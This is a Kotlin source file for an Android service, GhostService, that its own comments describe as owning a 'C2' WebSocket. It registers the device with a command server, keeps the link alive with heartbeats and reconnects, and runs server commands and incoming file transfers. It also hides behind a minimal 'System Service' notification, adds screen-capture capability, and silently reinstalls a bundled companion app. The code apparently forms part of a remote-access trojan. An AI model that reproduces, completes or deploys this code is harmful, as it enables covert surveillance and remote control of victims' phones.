package com.tg.ghostd

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import com.neovisionaries.ws.client.WebSocket
import com.neovisionaries.ws.client.WebSocketAdapter
import com.neovisionaries.ws.client.WebSocketException
import com.neovisionaries.ws.client.WebSocketFactory
import com.neovisionaries.ws.client.WebSocketFrame
import java.net.URI
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.CountDownLatch

/**
 * Persistent foreground service (dataSync). Owns the C2 WebSocket:
 * resolve endpoint -> connect -> register -> heartbeat 45s -> commands.
 * Auto-reconnects with backoff and re-resolves the endpoint on every
 * connect attempt. If no endpoint can be resolved (all RPCs failed, no
 * cache) it retries every 60s.
 */
class GhostService : Service() {

    private var worker: Thread? = null
    private var heartbeat: Timer? = null

    /** Wall-clock (elapsedRealtime) of the last inbound WS traffic. The
     *  heartbeat watchdog force-disconnects when this goes stale — without
     *  it, a half-open TCP connection (server died without RST reaching us)
     *  looks alive forever and the reconnect loop never wakes up. */
    @Volatile private var lastInbound = 0L
    @Volatile private var running = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        CommandHandler.init(this)
        // Start with ONLY the dataSync type: the manifest also declares
        // mediaProjection (promoted later via promoteToProjection()), and the
        // 2-arg startForeground would try to start ALL declared types —
        // mediaProjection without consent throws SecurityException on 14+.
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(
                NOTIFICATION_ID, buildNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }
        // Auto-arm the sidekick once the link is up (after setup); the
        // sidekick resets armed state on reboot, so ghostd re-arms on every
        // (re)connect. Fire-and-forget, retried by the link watcher.
        if (Prefs.setupDone(this)) {
            SidekickLink.startAutoArm()
            // ghostd update / reboot / sidekick wiped: re-check ghosta
            // presence and re-provision from the bundled asset when missing
            // or older than the bundle (silent when ghostd is the
            // installer-of-record). Fire-and-forget, never blocks the WS.
            SidekickInstaller.provisionBundledAsync(this, "service-start")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (worker == null) {
            running = true
            worker = Thread { runLoop() }.apply { name = "ghostd-c2"; start() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        stopHeartbeat()
        worker?.interrupt()
        worker = null
        if (instance === this) instance = null
        SidekickLink.stopAutoArm()
        SidekickLink.close()
        ProjectionHub.stop()
        super.onDestroy()
    }

    /**
     * Add the mediaProjection foreground-service type (Android 14+ requires
     * it before MediaProjectionManager.getMediaProjection). Both types are
     * declared in the manifest, so re-calling startForeground with both is
     * safe on 29+; pre-29 has no typed startForeground.
     */
    fun promoteToProjection() {
        if (Build.VERSION.SDK_INT >= 29) {
            try {
                startForeground(
                    NOTIFICATION_ID, buildNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } catch (_: Exception) {
                // some OEMs reject type changes; projection may still work
            }
        }
    }

    override fun onBind(intent: Intent): IBinder? = null

    // ------------------------------------------------------------------ C2

    private fun runLoop() {
        val resolver = EndpointResolver.forContext(this)
        var backoff = 5_000L
        while (running) {
            val endpoint = try {
                resolver.resolve()
            } catch (e: Exception) {
                android.util.Log.w("ghostd", "endpoint resolve threw: ${e.message}")
                null
            }
            if (endpoint == null) {
                // All RPCs failed and no cached endpoint: retry in 60s.
                android.util.Log.w("ghostd", "no endpoint (all RPCs failed, no cache); retry in 60s")
                if (!sleepQuietly(60_000L)) return
                continue
            }
            android.util.Log.i("ghostd", "resolved endpoint: $endpoint")
            val connectedOk = connect(endpoint)
            android.util.Log.i("ghostd", "connection ended, ok=$connectedOk, retry in ${backoff / 1000}s")
            if (!running) return
            backoff = if (connectedOk) 5_000L else minOf(backoff * 2, 60_000L)
            if (!sleepQuietly(backoff)) return
        }
    }

    /** Connects and blocks until the socket drops. Returns true if connected. */
    private fun connect(endpoint: String): Boolean {
        var connected = false
        var denied = false
        try {
            val latch = CountDownLatch(1)
            val ws = WebSocketFactory()
                .setConnectionTimeout(10_000)
                .createSocket(URI(endpoint))
            ws.addListener(object : WebSocketAdapter() {
                override fun onConnected(
                    websocket: WebSocket, headers: Map<String, List<String>>
                ) {
                    android.util.Log.i("ghostd", "WS connected to ${websocket.uri}")
                    connected = true
                    lastInbound = android.os.SystemClock.elapsedRealtime()
                    websocket.sendText(registerMessage())
                    startHeartbeat(websocket)
                }

                override fun onTextMessage(websocket: WebSocket, text: String) {
                    lastInbound = android.os.SystemClock.elapsedRealtime()
                    HelloAck.parse(text)?.let { ack ->
                        if (!handleHelloAck(websocket, ack)) denied = true
                        return
                    }
                    CommandHandler.handle(websocket, text)
                }

                override fun onBinaryMessage(websocket: WebSocket, binary: ByteArray) {
                    lastInbound = android.os.SystemClock.elapsedRealtime()
                    // incoming file streams (files put) — MediaBus framing
                    CommandHandler.onBinary(binary)
                }

                override fun onDisconnected(
                    websocket: WebSocket, serverCloseFrame: WebSocketFrame,
                    clientCloseFrame: WebSocketFrame, closedByServer: Boolean
                ) {
                    stopHeartbeat()
                    latch.countDown()
                }

                override fun onConnectError(websocket: WebSocket, cause: WebSocketException) {
                    android.util.Log.w("ghostd", "WS connect error: ${cause.message}")
                    stopHeartbeat()
                    latch.countDown()
                }

                override fun onError(websocket: WebSocket, cause: WebSocketException) {
                    // IO error mid-session; onDisconnected follows
                }
            })
            ws.connect()
            latch.await()
        } catch (_: Exception) {
            stopHeartbeat()
        }
        // denied keeps the exponential backoff growing (retry later, no tight loop)
        return connected && !denied
    }

    /**
     * Device registration on connect. Field names follow the daemon protocol
     * (server/daemon.py "hello"); model/android_version/battery included.
     * Device authentication: enroll_key always, plus the stored device
     * token (Prefs.deviceToken) when we have one — see HelloAck.
     */
    private fun registerMessage(): String {
        val battery = try {
            getSystemService(BatteryManager::class.java)
                .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) {
            -1
        }
        return HelloAck.buildHello(
            Prefs.deviceId(this),
            "${Build.MANUFACTURER} ${Build.MODEL}",
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT,
            AppUpdater.currentVersionName(this),
            battery,
            C2.ENROLL_KEY,
            Prefs.deviceToken(this)
        )
    }

    /**
     * Handles the hello_ack device-auth reply. Returns true when the socket
     * should stay open (approved/pending — token stored), false when denied
     * (token cleared, socket closed; reconnect loop retries with backoff).
     */
    private fun handleHelloAck(websocket: WebSocket, ack: HelloAck): Boolean {
        return when {
            ack.isDenied -> {
                android.util.Log.w("ghostd", "hello_ack status=denied; clearing token, dropping connection")
                Prefs.clearDeviceToken(this)
                try {
                    websocket.disconnect()
                } catch (_: Exception) {
                    // already dead; onDisconnected releases the latch
                }
                false
            }
            ack.isApproved || ack.isPending -> {
                ack.token?.let { Prefs.setDeviceToken(this, it) }
                android.util.Log.i("ghostd", "hello_ack status=${ack.status}; token ${if (ack.token == null) "unchanged" else "stored"}")
                true
            }
            else -> {
                // unknown status: keep the session, let the server decide
                android.util.Log.w("ghostd", "hello_ack unknown status=${ack.status}")
                true
            }
        }
    }

    private fun startHeartbeat(ws: WebSocket?) {
        stopHeartbeat()
        if (ws == null) return
        heartbeat = Timer("ghostd-hb", true).apply {
            scheduleAtFixedRate(object : TimerTask() {
                override fun run() {
                    try {
                        ws.sendText("""{"type":"ping"}""")
                    } catch (e: Exception) {
                        // socket dead: force-close so onDisconnected fires and
                        // the reconnect loop wakes up (previously this was
                        // swallowed and nobody noticed a dead connection)
                        android.util.Log.w("ghostd", "heartbeat send failed: ${e.message}")
                        try { ws.disconnect() } catch (_: Exception) {}
                        return
                    }
                    val idle = android.os.SystemClock.elapsedRealtime() - lastInbound
                    if (idle > HEARTBEAT_MS * 3) {
                        // half-open connection: server gone, TCP never told us.
                        // The daemon answers every ping with {"type":"pong"}, so
                        // a healthy connection never idles this long.
                        android.util.Log.w(
                            "ghostd", "no inbound for ${idle / 1000}s — forcing reconnect")
                        try { ws.disconnect() } catch (_: Exception) {}
                    }
                }
            }, HEARTBEAT_MS, HEARTBEAT_MS)
        }
    }

    private fun stopHeartbeat() {
        heartbeat?.cancel()
        heartbeat = null
    }

    private fun sleepQuietly(ms: Long): Boolean = try {
        Thread.sleep(ms)
        true
    } catch (_: InterruptedException) {
        Thread.currentThread().interrupt()
        false
    }

    private fun buildNotification(): Notification {
        val channel = NotificationChannel(
            CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN
        )
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            // Fallback tap target: opens the screen-capture consent activity
            // (primary path is the service starting it directly).
            .setContentIntent(
                android.app.PendingIntent.getActivity(
                    this, 0,
                    Intent(this, ScreenCaptureActivity::class.java),
                    android.app.PendingIntent.FLAG_IMMUTABLE
                )
            )
            .build()
    }

    companion object {
        private const val CHANNEL_ID = "ghostd"
        private const val NOTIFICATION_ID = 1
        private const val HEARTBEAT_MS = 45_000L

        /** Live service instance (for ProjectionHub's FGS promotion). */
        @Volatile var instance: GhostService? = null
            private set
    }
}
